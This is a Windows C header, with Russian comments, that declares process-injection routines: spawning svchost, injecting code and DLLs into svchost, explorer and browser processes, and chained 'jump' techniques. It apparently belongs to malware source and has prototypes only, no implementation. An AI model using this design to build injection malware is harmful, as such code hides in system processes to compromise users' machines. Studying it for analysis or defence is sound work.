#ifndef UUID_38DF963AD6BA4C53A9B00D570C9158C7
#define UUID_38DF963AD6BA4C53A9B00D570C9158C7

#include <windows.h>

DWORD GetImageBase();
DWORD GetImageBase2();

bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread );

DWORD InjectCode( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc );
bool InjectCode2( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) );
bool InjectCode3( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) );

bool InjectIntoSvchost( DWORD (WINAPI f_Main)(LPVOID) );
bool InjectIntoExplorer( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToSvchost( DWORD (WINAPI f_Main)(LPVOID) );
bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) );
bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) );

bool InjectDll( WCHAR *DllPath );

bool MegaJump( DWORD (WINAPI f_Main)(LPVOID) );


bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) );



#define RESERVED_MEMORY_INJECTED 0x1F


PVOID RemouteAllocateImageDll(HANDLE hProcess,PVOID pDll);

//
//	Инжектирует длл в процесс.
//	pDll		-	указатель на данные длл
//	RunRoutine	-	имя експортируемой процедуры которою нужно выполнить.
//		прототип:	VOID WINAPI Routine(PVOID Param); 
//	Param		-	параметр, который получит 	RunRoutine
//
//	Bозвращает  -   адрес загрузки длл
//	
PVOID InjectRemouteDll(HANDLE hProcess,PVOID pDll,PCHAR RunRoutine,DWORD Param);

#endif 